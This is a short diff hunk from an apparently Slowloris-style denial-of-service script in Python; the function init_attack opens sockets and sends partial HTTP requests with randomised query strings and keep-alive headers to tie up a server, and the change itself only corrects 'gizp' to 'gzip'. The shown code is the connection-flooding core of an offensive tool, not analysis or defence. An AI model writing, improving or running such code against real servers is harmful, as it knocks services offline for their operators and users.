@@ -78,7 +78,7 @@ def init_attack(nAttackers):
     s.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 50000)).encode())
     s.send("User-Agent: {}\r\n".format(agent).encode())
     s.send("Cache-Control: no-cache\r\n".encode())
-    s.send("Accept-Encoding: {}\r\n".format("gizp, deflate").encode())
+    s.send("Accept-Encoding: {}\r\n".format("gzip, deflate").encode())
     s.send("Accept-Language: {}\r\n".format("en-US,en;q=0.9").encode())
     s.send("Connection: keep-alive\r\n".encode())
     logging.debug("Creating attacker | ID: {}".format(identifier))
